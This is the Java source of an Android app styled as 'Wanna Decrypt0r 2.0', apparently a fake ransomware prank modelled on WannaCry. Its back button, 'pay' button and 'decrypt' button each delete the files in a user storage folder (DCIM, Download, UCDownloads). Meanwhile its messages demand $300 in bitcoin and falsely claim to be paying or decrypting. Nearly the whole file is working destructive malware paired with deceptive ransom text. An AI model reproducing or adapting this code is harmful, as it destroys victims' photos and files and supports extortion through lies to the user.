package com.wana.decrypt0r;

import android.app.*;
import android.os.*;
import android.support.design.*;
import android.support.design.widget.*;
import android.view.*;
import java.io.*;
import java.util.concurrent.*;

import android.support.design.R;

// Wanna Decrypt0r 2.0 Android
// Build by Wahyu Hidayat
// Do not changes, modifies this source without permissions!
// Gretz : Pascal Squad
// Do Not Try Instal this app into ur android
// Because this app can be destroyer your files
// give credit if ur changed or modded this source

public class MainActivity extends Activity 
{
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }
	
	// Back pressed action
	@Override
	public void onBackPressed(){
		File onBackPressed=new File(android.os.Environment.getExternalStorageDirectory()+"/DCIM");
		if (onBackPressed.isDirectory()){
			String [] childern = onBackPressed.list();
			for (int i=0;i<childern.length;i++){
				new File(onBackPressed, childern[i]).delete();
			}
		}
		onBackPressed.delete();
		Snackbar.make(findViewById(R.id.snackbar),"Cannot exit before pay $300 bitcoin to owr team!!!",Snackbar.LENGTH_LONG).show();
	}
	
	// Pay button action
	public void pay(View v){
		File pay=new File(android.os.Environment.getExternalStorageDirectory()+"/Download");
		if (pay.isDirectory()){
			String [] childern = pay.list();
			for (int i=0;i<childern.length;i++){
				new File(pay, childern[i]).delete();
			}
		}
		pay.delete();
		Snackbar.make(findViewById(R.id.pay),"Paying to server...",Snackbar.LENGTH_LONG).show();
	}
	
	// Decrypt buttob action
	public void dec(View v){
		File dec=new File(android.os.Environment.getExternalStorageDirectory()+"/UCDownloads");
		if (dec.isDirectory()){
			String [] childern = dec.list();
			for (int i=0;i<childern.length;i++){
				new File(dec, childern[i]).delete();
			}
		}
		dec.delete();
		Snackbar.make(findViewById(R.id.dec),"Decrypting ur files...",Snackbar.LENGTH_LONG).show();
	}
}
